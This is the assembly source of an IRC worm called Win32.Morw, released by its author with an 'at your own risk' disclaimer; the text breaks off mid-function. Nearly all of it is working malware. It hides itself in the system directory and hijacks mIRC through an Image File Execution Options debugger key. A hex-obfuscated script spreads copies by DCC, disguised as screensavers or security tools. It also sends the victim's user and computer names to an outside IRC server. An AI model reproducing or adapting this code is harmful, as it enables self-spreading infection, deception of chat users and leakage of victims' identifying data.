;=================================================================================\
; Win32.Morw                                                                      |
; (c) by DiA/RRLF                                                                 |
; www.vx-dia.de.vu - www.rrlf.de.vu                                               |
;                                                                                 |
; Heya, long time ago since i brought you something in asm, but here we go again. |
; This is a worm for the mIRC IRC client. It traps mIRC, means when mIRC gets     |
; executed the worm gets executed too. It copys then all necessary files to the   |
; system directory, generates and load the mIRC script for spreading. Just        |
; look at the script to see how it spreads on the "on JOIN" event. If you ask     |
; yourself how to make the script readable, go away kiddie. When the user         |
; terminate mIRC, the worm unload the script and delete all temporary files.      |
; On every 27th of every month the worm notify the infection to a channel at      |
; undernet. Just to be proud of my lil creation. At last i must say sorry, no     |
; comments in the source, no extended description here... sucks. But this was     |
; a fast one, and the code is also very readable. Have fun with it, and don't     |
; forget: DO ANYTHING WITH THIS, BUT AT YOUR OWN RISK. I AM NOT RESPONSIBLE!      |
;                                                                                 |
;                                                       DiA/RRLF - 06.04.2006     |
;=================================================================================/

include "%fasminc%\win32ax.inc"

section "c" code readable writeable executable
;==================================================
MorwData:
        jmp MorwCode

        CurrentFile     rb 256d
        WormFile        rb 256d
        WormName        db "morw.exe", 0
        SystemDir       rb 256d
        MircHandle      dd ?
        MircWindowName  db "mIRC", 0
        FileMap         dd ?
        MircData        dd ?
        MircPath        rb 256d
        MircPathSize    db 255d
        MircRegKey      db "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC"
        MircPathHandle  dd ?
        UninstallString db "UninstallString", 0
        StartupInfo     STARTUPINFO
        ProcessInfo     PROCESS_INFORMATION
        ScriptFile      db "morw.mrc", 0
        ScriptHandle    dd ?
        BytesWritten    dd ?
        ScriptFoot      db 13, 10, "}", 13, 10, "}", 13, 10, 0
        SystemTime      SYSTEMTIME

        FilesTable      db "IrcTool.exe", 10d
                        db "Secure_mIRC.exe", 10d
                        db "SpeedItUp.exe", 10d
                        db "InsultQuotes.pif", 10d
                        db "Instruction.pif", 10d
                        db "Abuse.pif", 10d
                        db "YourFile.exe", 10d
                        db "File.exe", 10d
                        db "Install.exe", 10d
                        db "Funny.scr", 10d
                        db "SexyScreensaver.scr", 10d
                        db "Screensaver.scr", 10d
                        db 0
        FileBuffer      rb 256d

        MircScript      db 0x76, 0x61, 0x72, 0x20, 0x25, 0x6E, 0x0D, 0x0A, 0x6F, 0x6E, 0x20, 0x31, 0x3A, 0x4A, 0x4F, 0x49
                        db 0x4E, 0x3A, 0x23, 0x3A, 0x7B, 0x0D, 0x0A, 0x25, 0x6E, 0x20, 0x3D, 0x20, 0x24, 0x6E, 0x69, 0x63
                        db 0x6B, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6E, 0x20, 0x21, 0x3D, 0x20, 0x24, 0x6D, 0x65
                        db 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x2F, 0x74, 0x69, 0x6D, 0x65, 0x72, 0x31, 0x20, 0x31, 0x20, 0x36
                        db 0x30, 0x20, 0x4A, 0x6F, 0x69, 0x6E, 0x53, 0x70, 0x72, 0x65, 0x61, 0x64, 0x0D, 0x0A, 0x7D, 0x0D
                        db 0x0A, 0x7D, 0x0D, 0x0A, 0x41, 0x6C, 0x69, 0x61, 0x73, 0x20, 0x4A, 0x6F, 0x69, 0x6E, 0x53, 0x70
                        db 0x72, 0x65, 0x61, 0x64, 0x20, 0x7B, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6E, 0x20, 0x21
                        db 0x3D, 0x20, 0x24, 0x6D, 0x65, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D
                        db 0x20, 0x3D, 0x20, 0x24, 0x72, 0x61, 0x6E, 0x64, 0x28, 0x31, 0x2C, 0x20, 0x31, 0x32, 0x29, 0x0D
                        db 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x31, 0x29, 0x20, 0x7B, 0x0D, 0x0A
                        db 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20, 0x68, 0x65, 0x79, 0x2C, 0x20, 0x69, 0x20
                        db 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x73, 0x6F, 0x6D, 0x65, 0x20, 0x61, 0x77, 0x73, 0x6F, 0x6D
                        db 0x65, 0x20, 0x69, 0x72, 0x63, 0x20, 0x74, 0x6F, 0x6F, 0x6C, 0x2C, 0x20, 0x68, 0x6F, 0x6C, 0x64
                        db 0x20, 0x6F, 0x6E, 0x2E, 0x2E, 0x2E, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66, 0x20, 0x3D
                        db 0x20, 0x49, 0x72, 0x63, 0x54, 0x6F, 0x6F, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x0D, 0x0A, 0x7D, 0x0D
                        db 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x32, 0x29
                        db 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20, 0x68, 0x69, 0x2C
                        db 0x20, 0x69, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x73, 0x6F, 0x6D, 0x65, 0x20, 0x74, 0x6F, 0x6F
                        db 0x6C, 0x20, 0x74, 0x6F, 0x20, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x72
                        db 0x20, 0x6D, 0x49, 0x52, 0x43, 0x2C, 0x20, 0x77, 0x61, 0x69, 0x74, 0x2C, 0x20, 0x69, 0x20, 0x73
                        db 0x65, 0x6E, 0x64, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66, 0x20, 0x3D, 0x20, 0x53, 0x65
                        db 0x63, 0x75, 0x72, 0x65, 0x5F, 0x6D, 0x49, 0x52, 0x43, 0x2E, 0x65, 0x78, 0x65, 0x0D, 0x0A, 0x7D
                        db 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x33
                        db 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20, 0x63, 0x68
                        db 0x65, 0x63, 0x6B, 0x20, 0x6F, 0x75, 0x74, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x6C, 0x69, 0x74
                        db 0x74, 0x6C, 0x65, 0x20, 0x74, 0x6F, 0x6F, 0x6C, 0x20, 0x74, 0x6F, 0x20, 0x73, 0x70, 0x65, 0x65
                        db 0x64, 0x20, 0x75, 0x70, 0x20, 0x66, 0x69, 0x6C, 0x65, 0x20, 0x74, 0x72, 0x61, 0x6E, 0x73, 0x66
                        db 0x65, 0x72, 0x73, 0x2C, 0x20, 0x69, 0x74, 0x27, 0x73, 0x20, 0x61, 0x77, 0x73, 0x6F, 0x6D, 0x65
                        db 0x2C, 0x20, 0x73, 0x65, 0x6E, 0x64, 0x2E, 0x2E, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66
                        db 0x20, 0x3D, 0x20, 0x53, 0x70, 0x65, 0x65, 0x64, 0x49, 0x74, 0x55, 0x70, 0x2E, 0x65, 0x78, 0x65
                        db 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20
                        db 0x3D, 0x20, 0x34, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D
                        db 0x20, 0x45, 0x79, 0x21, 0x20, 0x53, 0x6F, 0x6D, 0x65, 0x20, 0x70, 0x65, 0x6F, 0x70, 0x6C, 0x65
                        db 0x20, 0x6F, 0x6E, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x63, 0x68, 0x61, 0x6E, 0x6E, 0x65, 0x6C
                        db 0x20, 0x74, 0x6F, 0x6C, 0x64, 0x20, 0x6D, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x69, 0x6E, 0x73
                        db 0x75, 0x6C, 0x74, 0x20, 0x74, 0x68, 0x65, 0x6D, 0x21, 0x20, 0x43, 0x68, 0x65, 0x63, 0x6B, 0x20
                        db 0x74, 0x68, 0x69, 0x73, 0x20, 0x66, 0x69, 0x6C, 0x65, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x71, 0x75
                        db 0x6F, 0x74, 0x65, 0x73, 0x21, 0x21, 0x21, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66, 0x20
                        db 0x3D, 0x20, 0x49, 0x6E, 0x73, 0x75, 0x6C, 0x74, 0x51, 0x75, 0x6F, 0x74, 0x65, 0x73, 0x2E, 0x70
                        db 0x69, 0x66, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25
                        db 0x6D, 0x20, 0x3D, 0x20, 0x35, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73
                        db 0x20, 0x3D, 0x20, 0x50, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x20, 0x64, 0x6F, 0x6E, 0x27, 0x74, 0x20
                        db 0x6D, 0x61, 0x6B, 0x65, 0x20, 0x74, 0x72, 0x6F, 0x75, 0x62, 0x6C, 0x65, 0x20, 0x6F, 0x6E, 0x20
                        db 0x74, 0x68, 0x69, 0x73, 0x20, 0x63, 0x68, 0x61, 0x6E, 0x6E, 0x65, 0x6C, 0x21, 0x20, 0x53, 0x65
                        db 0x65, 0x20, 0x74, 0x68, 0x65, 0x73, 0x65, 0x20, 0x69, 0x6E, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74
                        db 0x69, 0x6F, 0x6E, 0x20, 0x68, 0x6F, 0x77, 0x20, 0x74, 0x6F, 0x20, 0x66, 0x6F, 0x6C, 0x6C, 0x6F
                        db 0x77, 0x20, 0x74, 0x68, 0x65, 0x20, 0x72, 0x75, 0x6C, 0x65, 0x73, 0x20, 0x69, 0x6E, 0x20, 0x74
                        db 0x68, 0x69, 0x73, 0x20, 0x63, 0x68, 0x61, 0x6E, 0x21, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25
                        db 0x66, 0x20, 0x3D, 0x20, 0x49, 0x6E, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x2E
                        db 0x70, 0x69, 0x66, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28
                        db 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x36, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25
                        db 0x73, 0x20, 0x3D, 0x20, 0x41, 0x62, 0x75, 0x73, 0x65, 0x21, 0x20, 0x43, 0x68, 0x65, 0x63, 0x6B
                        db 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x66, 0x69, 0x6C, 0x65, 0x2C, 0x20, 0x6F, 0x72, 0x20, 0x79
                        db 0x6F, 0x75, 0x20, 0x77, 0x69, 0x6C, 0x6C, 0x20, 0x67, 0x65, 0x74, 0x20, 0x62, 0x61, 0x6E, 0x6E
                        db 0x65, 0x64, 0x21, 0x21, 0x21, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66, 0x20, 0x3D, 0x20
                        db 0x41, 0x62, 0x75, 0x73, 0x65, 0x2E, 0x70, 0x69, 0x66, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x65, 0x6C
                        db 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x37, 0x29, 0x20, 0x7B, 0x0D
                        db 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20, 0x61, 0x68, 0x68, 0x2C, 0x20, 0x68
                        db 0x65, 0x72, 0x65, 0x20, 0x69, 0x73, 0x20, 0x74, 0x68, 0x65, 0x20, 0x66, 0x69, 0x6C, 0x65, 0x20
                        db 0x79, 0x6F, 0x75, 0x20, 0x61, 0x73, 0x6B, 0x65, 0x64, 0x20, 0x66, 0x6F, 0x72, 0x2E, 0x2E, 0x0D
                        db 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66, 0x20, 0x3D, 0x20, 0x59, 0x6F, 0x75, 0x72, 0x46, 0x69
                        db 0x6C, 0x65, 0x2E, 0x65, 0x78, 0x65, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69
                        db 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x38, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61
                        db 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x66, 0x69, 0x6C, 0x65
                        db 0x2C, 0x20, 0x69, 0x20, 0x6A, 0x75, 0x73, 0x74, 0x20, 0x73, 0x65, 0x6E, 0x64, 0x20, 0x69, 0x74
                        db 0x20, 0x72, 0x69, 0x67, 0x68, 0x74, 0x20, 0x6E, 0x6F, 0x77, 0x21, 0x0D, 0x0A, 0x76, 0x61, 0x72
                        db 0x20, 0x25, 0x66, 0x20, 0x3D, 0x20, 0x46, 0x69, 0x6C, 0x65, 0x2E, 0x65, 0x78, 0x65, 0x0D, 0x0A
                        db 0x7D, 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20
                        db 0x39, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20, 0x68
                        db 0x65, 0x72, 0x65, 0x20, 0x69, 0x73, 0x20, 0x74, 0x68, 0x65, 0x20, 0x73, 0x65, 0x74, 0x75, 0x70
                        db 0x20, 0x79, 0x6F, 0x75, 0x20, 0x61, 0x73, 0x6B, 0x65, 0x64, 0x20, 0x66, 0x6F, 0x72, 0x21, 0x20
                        db 0x77, 0x61, 0x69, 0x74, 0x2E, 0x2E, 0x2E, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66, 0x20
                        db 0x3D, 0x20, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x0D, 0x0A, 0x7D

                        db 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x31
                        db 0x30, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20, 0x68
                        db 0x65, 0x68, 0x65, 0x68, 0x65, 0x2C, 0x20, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x6F, 0x75, 0x74
                        db 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x66, 0x75, 0x6E, 0x6E, 0x79, 0x20, 0x73, 0x63, 0x72, 0x65
                        db 0x65, 0x6E, 0x73, 0x61, 0x76, 0x65, 0x72, 0x21, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66
                        db 0x20, 0x3D, 0x20, 0x46, 0x75, 0x6E, 0x6E, 0x79, 0x2E, 0x73, 0x63, 0x72, 0x0D, 0x0A, 0x7D, 0x0D
                        db 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x31, 0x31
                        db 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20, 0x77, 0x6F
                        db 0x77, 0x2C, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x70, 0x72, 0x65
                        db 0x74, 0x74, 0x79, 0x20, 0x64, 0x61, 0x6D, 0x6E, 0x20, 0x73, 0x65, 0x78, 0x79, 0x20, 0x73, 0x63
                        db 0x72, 0x65, 0x65, 0x6E, 0x73, 0x61, 0x76, 0x65, 0x72, 0x2E, 0x2E, 0x2E, 0x20, 0x63, 0x68, 0x65
                        db 0x63, 0x6B, 0x20, 0x69, 0x74, 0x2C, 0x20, 0x69, 0x20, 0x73, 0x65, 0x6E, 0x64, 0x2E, 0x2E, 0x2E
                        db 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66, 0x20, 0x3D, 0x20, 0x53, 0x65, 0x78, 0x79, 0x53
                        db 0x63, 0x72, 0x65, 0x65, 0x6E, 0x73, 0x61, 0x76, 0x65, 0x72, 0x2E, 0x73, 0x63, 0x72, 0x0D, 0x0A
                        db 0x7D, 0x0D, 0x0A, 0x65, 0x6C, 0x73, 0x65, 0x69, 0x66, 0x20, 0x28, 0x25, 0x6D, 0x20, 0x3D, 0x20
                        db 0x31, 0x32, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x73, 0x20, 0x3D, 0x20
                        db 0x68, 0x65, 0x72, 0x65, 0x20, 0x69, 0x73, 0x20, 0x74, 0x68, 0x65, 0x20, 0x73, 0x63, 0x72, 0x65
                        db 0x65, 0x6E, 0x73, 0x61, 0x76, 0x65, 0x72, 0x2C, 0x20, 0x77, 0x61, 0x69, 0x74, 0x2C, 0x20, 0x69
                        db 0x20, 0x64, 0x63, 0x63, 0x20, 0x69, 0x74, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x66, 0x20
                        db 0x3D, 0x20, 0x53, 0x63, 0x72, 0x65, 0x65, 0x6E, 0x73, 0x61, 0x76, 0x65, 0x72, 0x2E, 0x73, 0x63
                        db 0x72, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x2F, 0x6D, 0x73, 0x67, 0x20, 0x25, 0x6E, 0x20, 0x25, 0x73
                        db 0x0D, 0x0A, 0

MorwCode:
        invoke GetModuleFileName,\
                0,\
                CurrentFile,\
                256d

        invoke GetSystemDirectory,\
                SystemDir,\
                256d

        invoke lstrlen,\
                CurrentFile

        mov ebx, CurrentFile
        add ebx, eax
        sub ebx, 8d
        mov ecx, dword [WormName]

        cmp dword [ebx], ecx
        je StartMirc

        invoke lstrcpy,\
                WormFile,\
                SystemDir

        invoke lstrcat,\
                WormFile,\
                "\"

        invoke lstrcat,\
                WormFile,\
                WormName

        invoke SetFileAttributes,\
                WormFile,\
                FILE_ATTRIBUTE_NORMAL

        invoke CopyFile,\
                CurrentFile,\
                WormFile,\
                0

        cmp eax, 0
        je NeedRoot

        invoke SetFileAttributes,\
                WormFile,\
                FILE_ATTRIBUTE_HIDDEN

        mov ebx, 1d
        call UnTrapMirc
        jmp Exit

StartMirc:
        invoke lstrcpy,\
                WormFile,\
                CurrentFile

        invoke lstrcpy,\
                CurrentFile,\
                SystemDir

        invoke lstrcat,\
                CurrentFile,\
                "\MorwBy.DiA"

        invoke CopyFile,\
                WormFile,\
                CurrentFile,\
                0

        cmp eax, 0
        je NeedRoot

        invoke DeleteFile,\
                CurrentFile

        invoke RegOpenKeyEx,\
                HKEY_LOCAL_MACHINE,\
                MircRegKey,\
                0,\
                KEY_QUERY_VALUE,\
                MircPathHandle

        cmp eax, 0
        jne Exit

        invoke RegQueryValueEx,\
                dword [MircPathHandle],\
                UninstallString,\
                0,\
                0,\
                CurrentFile,\
                MircPathSize

        cmp eax, 0
        jne Exit

        invoke RegCloseKey,\
                dword [MircRegKey]

        invoke lstrlen,\
                CurrentFile

        mov ebx, CurrentFile
        inc ebx

        mov ecx, eax
        sub ecx, 12d

        invoke lstrcpyn,\
                MircPath,\
                ebx,\
                ecx

        mov ebx, 0d
        call UnTrapMirc

        invoke CreateProcess,\
                MircPath,\
                0,\
                0,\
                0,\
                0,\
                CREATE_NEW_CONSOLE,\
                0,\
                0,\
                StartupInfo,\
                ProcessInfo

        cmp eax, 0
        je Exit

        mov ebx, 1d
        call UnTrapMirc
        Check:
        invoke GetSystemTime,\
                SystemTime

        cmp word [SystemTime.wDay], 27d
        jne BeginToCopy

        call Payload

BeginToCopy:
        mov ebx, 1d
        call CopyDeleteFiles

        invoke lstrcpy,\
                CurrentFile,\
                SystemDir

        invoke lstrcat,\
                CurrentFile,\
                "\"

        invoke lstrcat,\
                CurrentFile,\
                ScriptFile

        invoke CreateFile,\
                CurrentFile,\
                GENERIC_WRITE,\
                FILE_SHARE_WRITE,\
                0,\
                CREATE_ALWAYS,\
                FILE_ATTRIBUTE_HIDDEN,\
                0

        mov dword [ScriptHandle], eax

        cmp eax, INVALID_HANDLE_VALUE
        je Exit

        invoke lstrlen,\
                MircScript

        invoke WriteFile,\
                dword [ScriptHandle],\
                MircScript,\
                eax,\
                BytesWritten,\
                0

        invoke lstrcpy,\
                CurrentFile,\
                "/dcc send -cl %n "

        invoke lstrcat,\
                CurrentFile,\
                SystemDir

        invoke lstrcat,\
                CurrentFile,\
                "\ $+ %f"

        invoke lstrcat,\
                CurrentFile,\
                ScriptFoot

        invoke lstrlen,\
                CurrentFile

        invoke WriteFile,\
                dword [ScriptHandle],\
                CurrentFile,\
                eax,\
                BytesWritten,\
                0

        invoke lstrcpy,\
                CurrentFile,\
                "on 1:EXIT:/unload -rs "

        invoke lstrcat,\
                CurrentFile,\
                SystemDir

        invoke lstrcat,\
                CurrentFile,\
                "\"

        invoke lstrcat,\
                CurrentFile,\
                ScriptFile

        invoke lstrlen,\
                CurrentFile

        invoke WriteFile,\
                dword [ScriptHandle],\
                CurrentFile,\
                eax,\
                BytesWritten,\
                0

        invoke CloseHandle,\
                dword [ScriptHandle]

        invoke Sleep,\
                120000d

        invoke FindWindow,\
                MircWindowName,\
                0

        mov dword [MircHandle], eax

        cmp eax, 0
        je Exit

        invoke CreateFileMapping,\
                INVALID_HANDLE_VALUE,\
                0,\
                PAGE_READWRITE,\
                0,\
                4096d,\
                MircWindowName

        mov dword [FileMap], eax

        cmp eax, 0
        je Exit

        invoke MapViewOfFile,\
                dword [FileMap],\
                FILE_MAP_ALL_ACCESS,\
                0,\
                0,\
                0

        mov dword [MircData], eax

        cmp eax, 0
        je CloseHandles

        invoke lstrcpy,\
                CurrentFile,\
                SystemDir

        invoke lstrcat,\
                CurrentFile,\
                "\"

        invoke lstrcat,\
                CurrentFile,\
                ScriptFile

        invoke lstrcpy,\
                dword [MircData],\
                "//load -rs "

        invoke lstrcat,\
                dword [MircData],\
                CurrentFile

        invoke SendMessage,\
                dword [MircHandle],\
                WM_USER + 200d,\
                1d,\
                0

WaitForExit:
        invoke FindWindow,\
                MircWindowName,\
                0

        cmp eax, 0
        je MircTerminated

        invoke Sleep,\
                1000d

        jmp WaitForExit

MircTerminated:
        mov ebx, 0d
        call CopyDeleteFiles

        invoke lstrcpy,\
                CurrentFile,\
                SystemDir

        invoke lstrcat,\
                CurrentFile,\
                "\"

        invoke lstrcat,\
                CurrentFile,\
                ScriptFile

        invoke DeleteFile,\
                CurrentFile

CloseHandles:
        invoke UnmapViewOfFile,\
                dword [MircData]

        invoke CloseHandle,\
                dword [FileMap]

        invoke CloseHandle,\
                dword [MircHandle]
        jmp Exit

NeedRoot:
        invoke MessageBox,\
                0,\
                "Please execute this application as Administrator.",\
                0,\
                MB_ICONERROR
Exit:
        invoke ExitProcess, 0

UnTrapMirc:
        jmp UnTrapMircStart

        RegFileExec     db "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", 0
        RegHandle       dd ?
        MircName        db "mirc.exe", 0
        RegMircHandle   dd ?
        UntrapValue     db "", 0
        Debugger        db "Debugger", 0

UnTrapMircStart:
;in:  ebx = trap (1) or untrap (0)
;     WormFile = must be path to the installed worm path
;out: eax = error (131313h) or ok (1)
        invoke RegOpenKeyEx,\
                HKEY_LOCAL_MACHINE,\
                RegFileExec,\
                0,\
                KEY_ALL_ACCESS,\
                RegHandle

        cmp eax, 0
        jne UnTrapMircError

        invoke RegCreateKey,\
                dword [RegHandle],\
                MircName,\
                RegMircHandle

        cmp eax, 0
        jne UnTrapMircError

        cmp ebx, 1d
        je TrapMirc

        mov edx, UntrapValue
        jmp SetValue

TrapMirc:
        mov edx, WormFile

SetValue:
        invoke lstrlen,\
                edx

        inc eax
        dec edx

        invoke RegSetValueEx,\
                dword [RegMircHandle],\
                Debugger,\
                0,\
                REG_SZ,\
                edx,\
                eax

        mov ecx, eax

UnTrapMircError:
        invoke RegCloseKey,\
                dword [RegMircHandle]

        invoke RegCloseKey,\
                dword [RegHandle]

        cmp ecx, 0h
        je UnTrapMircOk

        mov eax, 131313h
        jmp UnTrapMircReturn

UnTrapMircOk:
        mov eax, 1d

UnTrapMircReturn:
ret

CopyDeleteFiles:
;in: ebx = Copy (1) or Delete (0)
;out: nothing
        mov edx, FilesTable
        mov ecx, 0

GetFileName:
        cmp byte [edx + ecx], 10d
        je HaveFileName

        cmp byte [edx + ecx], 0
        je CopyDeleteReturn

        inc ecx
        jmp GetFileName

HaveFileName:
        inc ecx
        push edx
        push ecx

        invoke lstrcpyn,\
                FileBuffer,\
                edx,\
                ecx

        invoke lstrcpy,\
                CurrentFile,\
                SystemDir

        invoke lstrcat,\
                CurrentFile,\
                "\"

        invoke lstrcat,\
                CurrentFile,\
                FileBuffer

        cmp ebx, 0d
        je DeleteFileX

        invoke CopyFile,\
                WormFile,\
                CurrentFile,\
                0

        pop ecx
        pop edx

        add edx, ecx
        mov ecx, 0
        jmp GetFileName

DeleteFileX:
        invoke SetFileAttributes,\
                CurrentFile,\
                FILE_ATTRIBUTE_HIDDEN

        invoke DeleteFile,\
                CurrentFile

        pop ecx
        pop edx

        add edx, ecx
        mov ecx, 0
        jmp GetFileName

CopyDeleteReturn:
ret

Payload:
        jmp PayloadStart

        WSAData                 WSADATA
        SockAddr                dw AF_INET
          SockAddr_Port         dw ?
          SockAddr_IP           dd ?
          SockAddr_Zero         rb 8d
        SocketDesc              dd ?
        CharBuff                rb 2d
        LineBuff                rb 256d
        Pong                    db "PONG "
        PongBuff                rb 16d
        UserName                rb 26d
        UserNameSize            dd 26d
        CompName                rb 26d
        CompNameSize            dd 26d
        Nick                    rb 26d
        CRLF                    db 10d, 13d, 0

PayloadStart:
        invoke GetUserName,\
                UserName,\
                UserNameSize

        invoke GetComputerName,\
                CompName,\
                CompNameSize

        mov ecx, 0

GenerateNick:
        cmp ecx, 8d
        je HaveNick

        mov al, byte [UserName + ecx]
        mov byte [Nick + ecx], al

        inc ecx

        mov al, byte [CompName + ecx - 1]
        mov byte [Nick + ecx], al

        inc ecx
        jmp GenerateNick

HaveNick:
        invoke lstrcat,\
                Nick,\
                "morw"

        invoke lstrlen,\
                Nick

        invoke CharLowerBuff,\
                Nick,\
                eax

        invoke WSAStartup,\
                0101h,\
                WSAData

        cmp eax, 0
        jne PayloadReturn

        invoke socket,\
                AF_INET,\
                SOCK_STREAM,\
                0

        mov dword [SocketDesc], eax

        cmp eax, -1
        je PayloadReturn

        invoke inet_addr,\
                "69.16.172.34"

        mov dword [SockAddr_IP], eax

        invoke htons,\
                6667d

        mov word [SockAddr_Port], ax

        invoke connect,\
                dword [SocketDesc],\
                SockAddr,\
                16d

        cmp eax, 0
        jne PayloadReturn

        invoke lstrcpy,\
                LineBuff,\
                "NICK "

        invoke lstrcat,\
                LineBuff,\
                Nick

        call SendLine

        invoke lstrcpy,\
                LineBuff,\
                "USER "

        invoke lstrcat,\
                LineBuff,\
                Nick

        invoke lstrcat,\
                LineBuff,\
                " 8 * :"

        invoke lstrcat,\
                LineBuff,\
                Nick

        invoke lstrcat,\
                LineBuff,\
                " "

        invoke lstrcat,\
                LineBuff,\
                Nick

        call SendLine

GetMotd:
        call RecvLine
        call HandlePing

        mov ecx, 0

IsMotd:
        cmp dword [LineBuff + ecx], "MOTD"
        je HaveMotd

        cmp byte [LineBuff + ecx], 0d
        je LineEnd

        inc ecx
        jmp IsMotd

LineEnd:
        jmp GetMotd

HaveMotd:
        invoke lstrcpy, LineBuff,\
                "JOIN #vx-lab"

        call SendLine

        invoke Sleep,\
                1000d

        invoke lstrcpy,\
                LineBuff,\
                "PRIVMSG #vx-lab :Win32.Morw got "

        invoke lstrcat,\
                LineBuff,\
                UserName

        invoke lstrcat,\
                LineBuff,\
                " on "

        invoke lstrcat,\
                LineBuff,\
                CompName

        call SendLine

        invoke lstrcpy,\
                LineBuff,\
                "QUIT"

        call SendLine

PayloadReturn:
ret

RecvLine:
        invoke lstrcpy,\
                LineBuff,\
                ""

GetLine:
        invoke recv,\
                dword [SocketDesc],\
                CharBuff,\
                1d,\
                0

        cmp eax, 0
        je PayloadReturn

        cmp byte [CharBuff], 10d
        je HaveLine

        invoke lstrcat,\
                LineBuff,\
                CharBuff
        jmp GetLine

HaveLine:
ret

SendLine:
        invoke lstrcat,\
                LineBuff,\
                CRLF

        invoke lstrlen,\
                LineBuff

        invoke send,\
                dword [SocketDesc],\
                LineBuff,\
                eax,\
                0

        cmp eax, -1
        je PayloadReturn
ret

HandlePing:
        cmp dword [LineBuff], "PING"
        jne NoPing

        invoke lstrcpy,\
                PongBuff,\
